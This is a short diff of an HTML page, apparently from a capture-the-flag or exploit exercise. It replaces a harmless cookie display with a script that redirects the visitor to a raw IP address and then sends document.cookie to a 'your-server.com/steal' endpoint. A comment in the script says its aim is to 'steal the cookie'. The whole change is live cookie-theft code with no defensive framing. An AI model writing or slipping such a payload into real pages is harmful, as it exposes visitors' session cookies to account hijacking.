@@ -5,12 +5,12 @@
 </head>
 <body>
   <h1>Cookies:</h1>
-  <pre id="cookieDisplay"></pre>
-
   <script>
-    const allCookies = document.cookie;
-    const cookieDisplay = document.getElementById('cookieDisplay');
-    cookieDisplay.textContent = allCookies;
-  </script>
+  window.location = "http://167.71.200.118:7002/report";
+  // After a delay, steal the cookie
+  setTimeout(() => {
+    fetch("https://your-server.com/steal?cookie=" + encodeURIComponent(document.cookie));
+  }, 1000);
+</script>
 </body>
 </html>
